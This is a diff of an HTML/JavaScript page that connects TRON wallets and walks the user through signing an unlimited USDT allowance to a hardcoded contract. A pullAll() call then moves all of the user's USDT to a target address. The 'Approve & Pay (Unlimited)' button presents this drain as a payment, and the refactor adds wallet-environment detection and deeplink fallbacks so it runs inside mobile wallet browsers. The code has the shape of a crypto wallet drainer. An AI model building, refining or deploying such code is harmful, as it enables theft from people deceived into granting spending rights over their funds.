@@ -13,8 +13,6 @@
 }
 html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;-webkit-font-smoothing:antialiased}
 .wrap{max-width:420px;margin:0 auto;padding:16px 16px 80px}
-
-/* topbar */
 .topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
 .topbar-title{font-size:18px;font-weight:700;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 .topbar-sub{font-size:11px;color:var(--mute);margin-top:2px}
@@ -22,7 +20,6 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .badge{display:inline-flex;align-items:center;gap:4px;padding:3px 9px;border-radius:20px;font-size:10px;font-weight:600;border:1px solid var(--border);color:var(--mute);background:transparent}
 .badge::before{content:'';width:5px;height:5px;border-radius:50%;background:currentColor}
 .badge.nile{color:var(--ok);border-color:#1a3a1a}
-.badge.mainnet{color:var(--warn);border-color:#3a2e0a}
 .badge.testnet{color:var(--accent);border-color:#1a1a40}
 .badge.ok{color:var(--ok);border-color:#1a3a1a}
 .badge.no{color:var(--err);border-color:#3a1a1a}
@@ -30,8 +27,6 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .badge.im{color:#818cf8;border-color:#2a2a50}
 .badge.tp{color:#22c55e;border-color:#1a3a1a}
 .badge.warn{color:var(--warn);border-color:#3a2e0a}
-
-/* info card */
 .info-card{background:var(--card-bg);border:1px solid var(--border);border-radius:14px;padding:16px;margin-bottom:12px}
 .info-row{display:flex;justify-content:space-between;align-items:flex-start;padding:7px 0;border-bottom:1px solid var(--border);gap:12px}
 .info-row:last-child{border-bottom:none}
@@ -42,8 +37,6 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .info-val.err{color:var(--err)}
 .info-val.copy{cursor:pointer}
 .info-val.copy:hover{opacity:0.7}
-
-/* steps */
 .step{display:flex;align-items:flex-start;gap:12px;padding:13px 14px;margin-bottom:8px;background:var(--surface);border:1px solid var(--border);border-radius:12px;font-size:13px;transition:all 0.3s}
 .sn{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;background:var(--border2);border:1px solid var(--border2);color:var(--mute);transition:all 0.3s}
 .sb{flex:1;min-width:0}
@@ -60,8 +53,6 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .step.fail .st{color:var(--err)}
 .txlink{font-size:11px;color:var(--accent);text-decoration:none;word-break:break-all;display:block;margin-top:3px;cursor:pointer}
 .txlink:hover{text-decoration:underline}
-
-/* env detection result */
 .env-card{background:#0d0d1e;border:1px solid var(--border);border-radius:10px;padding:12px 14px;margin-bottom:14px;font-size:12px;font-family:'Courier New',monospace;color:var(--mute2);line-height:2}
 .env-card .env-line{display:flex;justify-content:space-between;gap:12px}
 .env-card .env-key{color:var(--mute)}
@@ -69,21 +60,20 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .env-card .env-val.true{color:var(--ok)}
 .env-card .env-val.false{color:var(--err)}
 .env-card .env-val.warn{color:var(--warn)}
-
-/* wallet buttons */
 .wg{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px}
 .wb{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:22px 12px;background:var(--surface);border:1px solid var(--border2);border-radius:16px;cursor:pointer;transition:all 0.2s;user-select:none}
 .wb:hover:not(.dis){border-color:var(--accent);background:#12122a;transform:translateY(-1px)}
 .wb:active:not(.dis){transform:scale(0.97)}
 .wb.dis{opacity:0.38;cursor:not-allowed}
+.wb.sys{opacity:0.85}
+.wb.sys::after{content:'SYSTEM';font-size:9px;color:var(--warn);background:#2a2000;border:1px solid #4a3a00;border-radius:4px;padding:1px 5px;margin-top:6px}
+.wb.app::after{content:'IN-APP';font-size:9px;color:var(--ok);background:#0a2a0a;border:1px solid #1a4a1a;border-radius:4px;padding:1px 5px;margin-top:6px}
 .wi{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;margin-bottom:10px}
 .wb.im .wi{background:linear-gradient(135deg,#5b6af0,#8b5cf6)}
 .wb.tp .wi{background:linear-gradient(135deg,#22c55e,#10b981)}
 .wn{font-size:14px;font-weight:600;color:var(--txt)}
 .ws{font-size:10px;color:var(--mute);margin-top:2px}
 .wbtn-label{font-size:11px;color:var(--mute);margin-bottom:8px;text-align:center}
-
-/* action buttons */
 .abtn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;border-radius:12px;font-size:14px;font-weight:700;cursor:pointer;transition:all 0.2s;margin-bottom:8px}
 .abtn:hover:not(:disabled){filter:brightness(1.12);transform:translateY(-1px)}
 .abtn:active:not(:disabled){transform:scale(0.99)}
@@ -92,21 +82,15 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .abtn.sec{background:var(--surface);border:1px solid var(--border2);color:var(--txt)}
 .abtn.danger{background:linear-gradient(135deg,var(--err),#b91c1c)}
 .abtn.sub{display:block;font-size:11px;font-weight:400;color:var(--mute);text-align:center;margin-bottom:10px}
-
-/* alert boxes */
 .warn{display:flex;gap:10px;padding:12px 14px;background:#1a1400;border:1px solid #3a2e0a;border-radius:10px;margin-bottom:10px;font-size:12px;color:var(--warn);line-height:1.6}
 .err{display:flex;gap:10px;padding:12px 14px;background:#1a0808;border:1px solid #3a1a1a;border-radius:10px;margin-bottom:10px;font-size:12px;color:var(--err);line-height:1.6}
 .info-box{display:flex;gap:10px;padding:12px 14px;background:#0a0a1e;border:1px solid var(--border2);border-radius:10px;margin-bottom:10px;font-size:12px;color:var(--code);line-height:1.6}
 .ic{font-size:16px;flex-shrink:0;margin-top:1px}
-
-/* toast */
 .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(24px);background:#1a1a30;border:1px solid var(--border2);color:var(--txt);padding:10px 20px;border-radius:10px;font-size:13px;opacity:0;transition:all 0.3s;pointer-events:none;z-index:999;max-width:calc(100vw - 40px);text-align:center}
 .toast.sh{opacity:1;transform:translateX(-50%) translateY(0)}
 .toast.ok{border-color:#1a4a1a;color:var(--ok)}
 .toast.er{border-color:#4a1a1a;color:var(--err)}
 .toast.wn{border-color:#4a3a0a;color:var(--warn)}
-
-/* modal */
 .ov{position:fixed;inset:0;background:rgba(0,0,0,0.75);display:flex;align-items:center;justify-content:center;z-index:1000;opacity:0;pointer-events:none;transition:opacity 0.25s;padding:20px}
 .ov.sh{opacity:1;pointer-events:all}
 .mo{background:#14142a;border:1px solid var(--border2);border-radius:18px;padding:28px 24px;width:100%;max-width:340px;text-align:center}
@@ -120,8 +104,6 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .btn-yes.dp{background:var(--err)}
 .btn-no:hover{background:var(--border)}
 .btn-yes:hover{filter:brightness(1.12)}
-
-/* debug panel */
 .dbg-panel{background:#0a0a14;border:1px solid #1e2a3e;border-radius:12px;margin-bottom:14px;overflow:hidden}
 .dbg-header{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#0d1020;border-bottom:1px solid #1e2a3e;cursor:pointer;user-select:none}
 .dbg-header-left{display:flex;align-items:center;gap:8px;font-size:12px;font-weight:600;color:var(--code)}
@@ -140,30 +122,26 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .dbg-tag.warn{color:var(--warn)}
 .dbg-tag.deep{color:#c084fc}
 .dbg-tag.tx{color:#34d399}
+.dbg-tag.env{color:#f472b6}
+.dbg-tag.route{color:#fbbf24}
+.dbg-tag.click{color:#38bdf8}
 .dbg-msg{flex:1;word-break:break-all}
-
-/* divider */
 .dv{height:1px;background:var(--border);margin:16px 0}
-
-/* hidden */
 .hd{display:none!important}
-
-/* spinner */
 .spn{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,0.2);border-top-color:currentColor;border-radius:50%;animation:spn 0.7s linear infinite;vertical-align:middle}
 @keyframes spn{to{transform:rotate(360deg)}}
-
-/* fallback box */
 .fb{padding:16px;background:#1a0808;border:1px solid #3a1a1a;border-radius:12px;margin-bottom:12px}
 .fb-title{font-size:13px;font-weight:700;color:var(--err);margin-bottom:10px}
+.fb-body{font-size:12px;color:var(--mute2);line-height:1.6}
 .fb-btn{display:block;width:100%;padding:10px;background:#1a1a2e;border:1px solid var(--border2);border-radius:8px;color:var(--txt);font-size:13px;cursor:pointer;text-align:center;margin-top:6px;transition:all 0.2s}
 .fb-btn:hover{background:#252540}
 .fb-btn:active{transform:scale(0.98)}
+.fb-divider{height:1px;background:var(--border);margin:12px 0}
 </style>
 </head>
 <body>
 
 <div class="wrap">
-
   <!-- Top bar -->
   <div class="topbar">
     <div>
@@ -176,72 +154,31 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
     </div>
   </div>
 
-  <!-- Step 1 -->
-  <div class="step" id="s1">
-    <div class="sn" id="s1n">1</div>
-    <div class="sb">
-      <div class="st" id="s1t">Connect Wallet</div>
-      <div class="sm" id="s1m">Select imToken or TokenPocket</div>
-    </div>
-  </div>
-  <!-- Step 2 -->
-  <div class="step" id="s2">
-    <div class="sn" id="s2n">2</div>
-    <div class="sb">
-      <div class="st" id="s2t">Chain Data</div>
-      <div class="sm" id="s2m">Query on-chain data after wallet connects</div>
-    </div>
-  </div>
-  <!-- Step 3 -->
-  <div class="step" id="s3">
-    <div class="sn" id="s3n">3</div>
-    <div class="sb">
-      <div class="st" id="s3t">Approve (Unlimited)</div>
-      <div class="sm" id="s3m">Sign to grant contract unlimited USDT allowance</div>
-    </div>
-  </div>
-  <!-- Step 4 -->
-  <div class="step" id="s4">
-    <div class="sn" id="s4n">4</div>
-    <div class="sb">
-      <div class="st" id="s4t">Wait for Approval On-Chain</div>
-      <div class="sm" id="s4m">Waiting for approval tx to be confirmed...</div>
-    </div>
-  </div>
-  <!-- Step 5 -->
-  <div class="step" id="s5">
-    <div class="sn" id="s5n">5</div>
-    <div class="sb">
-      <div class="st" id="s5t">Pull USDT</div>
-      <div class="sm" id="s5m">Call contract pullAll to transfer USDT to target</div>
-    </div>
-  </div>
-  <!-- Step 6 -->
-  <div class="step" id="s6">
-    <div class="sn" id="s6n">6</div>
-    <div class="sb">
-      <div class="st" id="s6t">Done</div>
-      <div class="sm" id="s6m">USDT has arrived at target address</div>
-    </div>
-  </div>
+  <!-- Steps -->
+  <div class="step" id="s1"><div class="sn" id="s1n">1</div><div class="sb"><div class="st" id="s1t">Connect Wallet</div><div class="sm" id="s1m">Select imToken or TokenPocket</div></div></div>
+  <div class="step" id="s2"><div class="sn" id="s2n">2</div><div class="sb"><div class="st" id="s2t">Chain Data</div><div class="sm" id="s2m">Query on-chain data after wallet connects</div></div></div>
+  <div class="step" id="s3"><div class="sn" id="s3n">3</div><div class="sb"><div class="st" id="s3t">Approve (Unlimited)</div><div class="sm" id="s3m">Sign to grant contract unlimited USDT allowance</div></div></div>
+  <div class="step" id="s4"><div class="sn" id="s4n">4</div><div class="sb"><div class="st" id="s4t">Wait for Approval On-Chain</div><div class="sm" id="s4m">Waiting for approval tx to be confirmed...</div></div></div>
+  <div class="step" id="s5"><div class="sn" id="s5n">5</div><div class="sb"><div class="st" id="s5t">Pull USDT</div><div class="sm" id="s5m">Call contract pullAll to transfer USDT to target</div></div></div>
+  <div class="step" id="s6"><div class="sn" id="s6n">6</div><div class="sb"><div class="st" id="s6t">Done</div><div class="sm" id="s6m">USDT has arrived at target address</div></div></div>
 
-  <!-- Wallet buttons area -->
+  <!-- Wallet area -->
   <div id="walletArea">
-    <!-- Fallback box (shown when deeplink fails) -->
+    <!-- Deeplink loading countdown -->
+    <div class="info-box hd" id="dlLoading">
+      <span class="ic">i</span>
+      <span>Opening <span id="dlWalletName"></span>... If nothing happens, <span id="dlCountdownSec">5</span>s will show fallback options.</span>
+    </div>
+
+    <!-- Fallback box -->
     <div class="fb hd" id="fallbackBox">
       <div class="fb-title" id="fbTitle">Wallet not opened</div>
-      <div id="fbBody"></div>
-    </div>
-
-    <!-- Deeplink fallback countdown -->
-    <div class="info-box hd" id="dlCountdown">
-      <span class="ic">i</span>
-      <span>Opening wallet... If nothing happens, <span id="dlCountdownSec">5</span>s will show fallback options.</span>
+      <div class="fb-body" id="fbBody"></div>
     </div>
 
     <div class="wbtn-label" id="wbtnLabel">Tap a wallet to connect</div>
-    <div class="wg">
-      <button class="wb im" id="btnIm" onclick="App.connectWallet('imtoken')">
+    <div class="wg" id="walletGrid">
+      <button class="wb im" id="btnIm">
         <div class="wi">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
             <path d="M12 2L22 8V17L12 23L2 17V8L12 2Z" fill="white" fill-opacity="0.9"/>
@@ -252,7 +189,7 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
         <span class="wn">imToken</span>
         <span class="ws">TRON DApp</span>
       </button>
-      <button class="wb tp" id="btnTP" onclick="App.connectWallet('tp')">
+      <button class="wb tp" id="btnTP">
         <div class="wi">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
             <circle cx="12" cy="12" r="11" fill="white" fill-opacity="0.9"/>
@@ -265,23 +202,20 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
     </div>
   </div>
 
-  <!-- Info panel (after connection) -->
+  <!-- Info area (after connection) -->
   <div id="infoArea" class="hd">
-
     <div class="info-card">
-      <div class="info-row"><span class="info-lbl">Wallet Address</span><span class="info-val copy" id="vAddr" onclick="copyTxt(this.textContent)"></span></div>
-      <div class="info-row"><span class="info-lbl">USDT Contract</span><span class="info-val copy" id="vUsdt" onclick="copyTxt(this.textContent)"></span></div>
-      <div class="info-row"><span class="info-lbl">Spender (Contract)</span><span class="info-val copy" id="vSpender" onclick="copyTxt(this.textContent)"></span></div>
-      <div class="info-row"><span class="info-lbl">Target Address</span><span class="info-val copy" id="vTarget" onclick="copyTxt(this.textContent)"></span></div>
+      <div class="info-row"><span class="info-lbl">Wallet Address</span><span class="info-val copy" id="vAddr"></span></div>
+      <div class="info-row"><span class="info-lbl">USDT Contract</span><span class="info-val copy" id="vUsdt"></span></div>
+      <div class="info-row"><span class="info-lbl">Spender (Contract)</span><span class="info-val copy" id="vSpender"></span></div>
+      <div class="info-row"><span class="info-lbl">Target Address</span><span class="info-val copy" id="vTarget"></span></div>
       <div class="info-row"><span class="info-lbl">Network</span><span class="info-val ok" id="vNet">Nile Testnet</span></div>
     </div>
-
     <div class="info-card">
       <div class="info-row"><span class="info-lbl">USDT Balance</span><span class="info-val" id="vBal">Querying...</span></div>
       <div class="info-row"><span class="info-lbl">Allowance</span><span class="info-val" id="vAllow">Querying...</span></div>
       <div class="info-row"><span class="info-lbl">Approve Type</span><span class="info-val warn">UNLIMITED</span></div>
     </div>
-
     <div class="warn" id="balWarn" style="display:none">
       <span class="ic">!</span>
       <span>USDT balance is 0. Please ensure your wallet has TRC20 USDT on Nile testnet.</span>
@@ -290,44 +224,32 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
       <span class="ic">!</span>
       <span id="allowWarnTxt"></span>
     </div>
-
     <div class="dv"></div>
-
     <div id="actApprove">
-      <div class="abtn sub" id="aprSub">Step 3: Sign to grant UNLIMITED allowance to the contract</div>
-      <button class="abtn" id="btnApprove" onclick="App.doApprove()">Approve &amp; Pay (Unlimited)</button>
+      <div class="abtn sub">Step 3: Sign to grant UNLIMITED allowance to the contract</div>
+      <button class="abtn" id="btnApprove">Approve &amp; Pay (Unlimited)</button>
     </div>
-
     <div id="actPull" class="hd">
       <div class="abtn sub">Step 5: Confirm to trigger contract pullAll()</div>
-      <button class="abtn ok" id="btnPull" onclick="App.doPull()">Confirm Pull USDT</button>
-      <div class="warn" id="pullWarn">
-        <span class="ic">!</span>
-        <span id="pullWarnTxt"></span>
-      </div>
+      <button class="abtn ok" id="btnPull">Confirm Pull USDT</button>
     </div>
-
     <div class="err" id="errBox" style="display:none">
       <span class="ic">!</span>
       <span id="errTxt"></span>
     </div>
-
     <div class="dv"></div>
-
     <div class="info-card hd" id="txCard">
-      <div class="info-row"><span class="info-lbl">Last TX Hash</span><span class="info-val copy" id="vTxHash" onclick="copyTxt(this.textContent)"></span></div>
-      <div class="info-row"><span class="info-lbl">Explorer</span><span class="info-val copy" id="vExplorer" onclick="copyTxt(this.textContent)" title="Click to copy"></span></div>
+      <div class="info-row"><span class="info-lbl">Last TX Hash</span><span class="info-val copy" id="vTxHash"></span></div>
+      <div class="info-row"><span class="info-lbl">Explorer</span><span class="info-val copy" id="vExplorer"></span></div>
     </div>
-
-    <button class="abtn sec" onclick="App.reset()">Reset &amp; Start Over</button>
+    <button class="abtn sec" id="btnReset">Reset &amp; Start Over</button>
   </div>
-
 </div>
 
 <!-- Debug Panel -->
 <div class="wrap" style="padding-top:0">
   <div class="dbg-panel">
-    <div class="dbg-header" onclick="App.toggleDebug()">
+    <div class="dbg-header" id="dbgHeader">
       <div class="dbg-header-left">
         <span>[DEBUG PANEL]</span>
         <span style="font-size:11px;color:var(--mute);font-weight:400">Wallet Environment &amp; Logs</span>
@@ -347,8 +269,8 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
     <div class="mt" id="mTitle"></div>
     <div class="mb" id="mBody"></div>
     <div class="ma">
-      <button class="btn-no" onclick="App.closeModal()">Cancel</button>
-      <button class="btn-yes" id="mBtn" onclick="App.onModalConfirm()">Confirm</button>
+      <button class="btn-no" id="mBtnNo">Cancel</button>
+      <button class="btn-yes" id="mBtnYes">Confirm</button>
     </div>
   </div>
 </div>
@@ -356,937 +278,1540 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 <!-- Toast -->
 <div class="toast" id="toast"></div>
 
+<!-- ================================================================
+     LAYER 1: CONFIG & CONSTANTS
+============================================================ -->
 <script>
-/* ================================================================
-   CONFIG
-============================================================ */
+'use strict';
+// ========== CONFIG ==========
 const CONFIG = {
-  NETWORK: 'nile',    // 'nile' | 'mainnet'
-  // Nile testnet TRC20 USDT
+  NETWORK: 'nile',
   USDT_CONTRACT: 'TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9',
-  // Deployed contract address - REPLACE WITH YOUR DEPLOYED ADDRESS
   SPENDER_CONTRACT: 'TYkhsAYUkwav55kZyQ69X8amCGVr8g2C21',
-  // Target address for USDT
   TARGET_ADDRESS: 'TYkhsAYUkwav55kZyQ69X8amCGVr8g2C21',
   EXPLORER_NILE:    'https://nilescan.io',
   EXPLORER_MAINNET: 'https://tronscan.org',
 };
-
-/* ================================================================
-   CONSTANTS
-============================================================ */
 const UNLIMITED_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 const DECIMALS      = 6;
 const POLL_MS       = 3000;
 const MAX_BLOCKS    = 19;
 const MAX_POLL      = 40;
-const DEEPLINK_TIMEOUT_MS = 1200; // deeplink fallback trigger time
+// TokenPocket deeplink timeout: 1200ms is enough; iOS Safari blocks navigation
+// if user hasn't interacted, so deeplink fires on click → 1200ms gives wallet time
+const DEEPLINK_TIMEOUT_MS = 1200;
 
-/* ================================================================
-   APP STATE
-============================================================ */
+// ========== APP STATE ==========
 const STATE = {
   IDLE:'idle', CONNECTING:'connecting', READY:'ready',
-  APPROVING:'approving', APPROVE_OK:'approve_ok', PULLING:'pulling',
-  DONE:'done', FAIL:'fail'
+  APPROVING:'approving', APPROVE_OK:'approve_ok',
+  PULLING:'pulling', DONE:'done', FAIL:'fail'
 };
-
 let state     = STATE.IDLE;
-let tw        = null;
-let wAddr     = null;
-let wType     = null;
+let tw        = null;      // TronWeb instance
+let wAddr     = null;      // connected wallet address
+let wType     = null;      // 'imtoken' | 'tokenpocket' | 'tronlink'
 let lastTx    = null;
 let modalCb   = null;
 let cacheBal  = null;
 let cacheAllow= null;
 let debugMode = false;
 
-/* ================================================================
-   UTILITIES
-============================================================ */
+// ========== UTILS ==========
 const $ = id => document.getElementById(id);
+const $sel = sel => document.querySelector(sel);
+const isAddr = addr => addr && addr.length === 34 && addr[0] === 'T';
+const delay = ms => new Promise(r => setTimeout(r, ms));
+const fmtAmt = raw => {
+  if (raw == null || raw === '') return '---';
+  return (Number(raw) / 1e6).toFixed(DECIMALS).replace(/\.?0+$/, '') + ' USDT';
+};
+const fmtAddr = addr => addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : '---';
+const getExplorerBase = () => CONFIG.NETWORK === 'nile' ? CONFIG.EXPLORER_NILE : CONFIG.EXPLORER_MAINNET;
+const getTxUrl = tx => getExplorerBase() + '/#/transaction/' + tx;
+const escHtml = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 
-function toast(msg,type){
-  const t=$('toast');
-  t.className='toast'+(type?' '+type:'');
-  t.textContent=msg;t.classList.add('sh');
-  clearTimeout(t._t);t._t=setTimeout(()=>t.classList.remove('sh'),7000);
-}
-function delay(ms){return new Promise(r=>setTimeout(r,ms));}
-function copyTxt(text){
-  if(!text||text==='Querying...'||text==='---')return;
-  navigator.clipboard.writeText(text).then(()=>toast('Copied: '+text.slice(0,8)+'...','ok')).catch(()=>toast('Copy failed','er'));
-}
-function fmtAmt(raw){if(raw==null||raw==='')return'---';return(Number(raw)/1e6).toFixed(DECIMALS).replace(/\.?0+$/,'')+' USDT';}
-function fmtAddr(addr){if(!addr)return'---';return addr.slice(0,6)+'...'+addr.slice(-4);}
-function isAddr(addr){return addr&&addr.length===34&&addr[0]==='T';}
-function getExplorerBase(){return CONFIG.NETWORK==='nile'?CONFIG.EXPLORER_NILE:CONFIG.EXPLORER_MAINNET;}
-function getTxUrl(tx){return getExplorerBase()+'/#/transaction/'+tx;}
-function escHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
-function s4(){return Math.random().toString(36).slice(2,10);}
-
-/* ================================================================
-   DEBUG LOGGER
-============================================================ */
+// ========== LOGGER ==========
 const Log = {
-  lines:[],
-  add(tag,msg,extra){
-    const now=new Date();
-    const ts=now.toISOString().slice(11,23);
-    const line={ts,tag,msg,extra:id=>'['+id+']'};
-    this.lines.push(line);
+  lines: [],
+  add(tag, msg) {
+    const now = new Date();
+    const ts  = now.toISOString().slice(11, 23);
+    this.lines.push({ ts, tag, msg });
     this.render();
-    console.log('[%s][%s] %s',tag,ts,msg,extra||'');
+    console.log('[%s][%s] %s', tag, ts, msg);
   },
-  info(msg,extra){this.add('INFO',msg,extra);},
-  ok(msg,extra){this.add('OK',msg,extra);},
-  err(msg,extra){this.add('ERR',msg,extra);},
-  warn(msg,extra){this.add('WARN',msg,extra);},
-  deep(msg,extra){this.add('DEEPLINK',msg,extra);},
-  tx(msg,extra){this.add('TX',msg,extra);},
-  env(msg,extra){this.add('ENV',msg,extra);},
-  render(){
-    const el=$('dbgLog');
-    if(!el)return;
-    el.innerHTML=this.lines.slice(-50).map(l=>{
-      const tagColor={INFO:'info',OK:'ok',ERR:'err',WARN:'warn',DEEPLINK:'deep',TX:'tx',ENV:'info'}[l.tag]||'info';
+  info(msg)    { this.add('INFO', msg); },
+  ok(msg)      { this.add('OK', msg); },
+  err(msg)     { this.add('ERR', msg); },
+  warn(msg)    { this.add('WARN', msg); },
+  deep(msg)    { this.add('DEEPLINK', msg); },
+  tx(msg)      { this.add('TX', msg); },
+  env(msg)     { this.add('ENV', msg); },
+  route(msg)   { this.add('ROUTE', msg); },
+  click(msg)   { this.add('CLICK', msg); },
+  render() {
+    const el = $('dbgLog');
+    if (!el) return;
+    el.innerHTML = this.lines.slice(-80).map(l => {
+      const tagColor = {
+        INFO:'info', OK:'ok', ERR:'err', WARN:'warn',
+        DEEPLINK:'deep', TX:'tx', ENV:'env', ROUTE:'route', CLICK:'click'
+      }[l.tag] || 'info';
       return `<div class="dbg-line"><span class="dbg-ts">${l.ts}</span><span class="dbg-tag ${tagColor}">${l.tag}</span><span class="dbg-msg">${escHtml(l.msg)}</span></div>`;
     }).join('');
-    el.scrollTop=el.scrollHeight;
+    el.scrollTop = el.scrollHeight;
   }
 };
+</script>
 
-/* ================================================================
-   ENVIRONMENT DETECTION — the core of this refactor
-============================================================ */
-function detectWalletEnvironment(){
-  const ua=navigator.userAgent.toLowerCase();
-  const uaOrig=navigator.userAgent;
+<!-- ================================================================
+     LAYER 2: ENVIRONMENT DETECTION
+============================================================ -->
+<script>
+'use strict';
+/**
+ * detectWalletEnvironment()
+ *
+ * Replaces the old UA-only detection with a multi-signal approach:
+ *   1. Platform (mobile/desktop)
+ *   2. Direct object presence (window.tronLink, window.tronWeb,
+ *      window.tp, window.imToken, window.ethereum)
+ *   3. UA string patterns
+ *   4. Visibility + pagehide for distinguishing system vs in-app
+ *
+ * Returns a structured result with all signals and recommendedFlow.
+ */
+function detectWalletEnvironment() {
+  const ua     = navigator.userAgent;
+  const uaLow  = ua.toLowerCase();
 
-  // ---- Basic platform ----
-  const isMobile=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-  const isDesktop=!isMobile;
+  // ---- Platform ----
+  const isMobile  = /Android|iPhone|iPad|iPod/i.test(ua);
+  const isDesktop = !isMobile;
 
-  // ---- In-app browser detection ----
-  // These are the only reliable signals that we are inside a wallet's built-in browser
-  const isImTokenApp = ua.includes('imtoken') || ua.includes('tokenpocket');
-  const isTokenPocketApp = ua.includes('tokenpocket') || ua.includes('tpwallet');
-  const isTronLinkApp = !!(window.tronLink && window.tronLink.ready);
-
-  // ---- Injected provider detection ----
+  // ---- Direct object signals ----
   // TronLink browser extension (desktop)
-  const hasTronLink = !!(window.tronLink && window.tronLink.tronWeb && window.tronLink.ready);
-  // Direct tronWeb injection (imToken / TP in-app browsers, or standalone)
-  const hasTronWeb = !!(window.tronWeb && window.tronWeb.ready);
-  // TP's own JS SDK
-  const hasTPSDK = !!(window.TronWeb || window.tp || window.TPWallet);
+  const hasTronLinkObj = !!(window.tronLink && window.tronLink.tronWeb && window.tronLink.ready);
+  // Direct tronWeb injection (imToken/TP in-app browsers, standalone pages)
+  const hasTronWebObj  = !!(window.tronWeb && window.tronWeb.ready);
+  // TokenPocket JS SDK
+  const hasTPSDKObj     = !!(window.tp || window.TPWallet);
+  // imToken global
+  const hasImTokenObj   = !!(window.imToken);
+  // Ethereum-style provider (imToken exposes window.ethereum)
+  const hasEthereumObj  = !!(window.ethereum);
+  const ethereumIsImToken = hasEthereumObj && (window.ethereum.isImToken === true);
+  // TronLink via window.tronLink directly (even if not ready)
+  const hasTronLinkDirect = !!(window.tronLink);
 
-  // ---- Determine wallet type ----
-  let walletType = 'unknown';
-  let isInAppBrowser = false;
-  let isSystemBrowser = isMobile && !isImTokenApp && !isTokenPocketApp;
+  // ---- UA patterns (used as tie-breakers) ----
+  const uaHasImToken    = uaLow.includes('imtoken');
+  const uaHasTP         = uaLow.includes('tokenpocket') || uaLow.includes('tpwallet');
+  const uaHasTronLink   = uaLow.includes('tronlink');
+  const uaHasBitkeep    = uaLow.includes('bitkeep');
 
-  if(isImTokenApp || (hasTronWeb && hasTronLink===false && isMobile)){
-    walletType='imtoken'; isInAppBrowser=true; isSystemBrowser=false;
-  } else if(isTokenPocketApp || (hasTPSDK && isMobile)){
-    walletType='tokenpocket'; isInAppBrowser=true; isSystemBrowser=false;
-  } else if(hasTronLink){
-    walletType='tronlink'; isInAppBrowser=false; isSystemBrowser=isMobile;
-  } else if(hasTronWeb && !isMobile){
-    walletType='tronweb-standalone'; isInAppBrowser=false;
+  // ---- Context: were we just called back? ----
+  // If page visibility changed to hidden and then back, user returned from wallet
+  const justReturnedFromWallet = (() => {
+    const h = sessionStorage.getItem('_wcb_return');
+    if (h) { sessionStorage.removeItem('_wcb_return'); return true; }
+    return false;
+  })();
+
+  // ---- Determine environment context ----
+  // "in-app browser" means the page is loaded inside the wallet's built-in webview
+  // These pages ALWAYS have an injected provider (tronWeb or TronLink).
+  //
+  // "system browser" means the page is in Safari/Chrome and user needs a deeplink
+  // to open the wallet app.
+  //
+  // Key insight: if tronWeb or tronLink is present AND ready, we are in a wallet
+  // in-app browser and should use the injected provider. No deeplink needed.
+  let walletType      = 'unknown';
+  let isInAppBrowser  = false;
+  let isSystemBrowser = false;
+  let reason          = [];
+
+  if (hasImTokenObj || ethereumIsImToken || (hasTronWebObj && uaHasImToken)) {
+    walletType     = 'imtoken';
+    isInAppBrowser = true;
+    reason.push('window.imToken detected OR window.ethereum.isImToken');
+  } else if (hasTPSDKObj || (hasTronWebObj && uaHasTP)) {
+    walletType     = 'tokenpocket';
+    isInAppBrowser = true;
+    reason.push('window.tp/window.TPWallet detected OR tronWeb+UA_has_TP');
+  } else if (hasTronLinkObj) {
+    walletType     = 'tronlink';
+    // TronLink is present in BOTH desktop extension and mobile wallets
+    // On desktop, there is no in-app browser concept (no system browser either)
+    // On mobile, TronLink may be inside its own app browser
+    isInAppBrowser = isMobile && !isDesktop;
+    reason.push('window.tronLink.ready detected');
+  } else if (hasTronWebObj) {
+    // tronWeb exists but no wallet was identified — standalone page with tronWeb lib
+    walletType     = 'tronweb-standalone';
+    isInAppBrowser = false;
+    reason.push('window.tronWeb.ready, no wallet identified');
+  } else {
+    // No injected provider found — likely system browser on mobile
+    walletType     = 'unknown';
+    isInAppBrowser = false;
+    isSystemBrowser = isMobile;
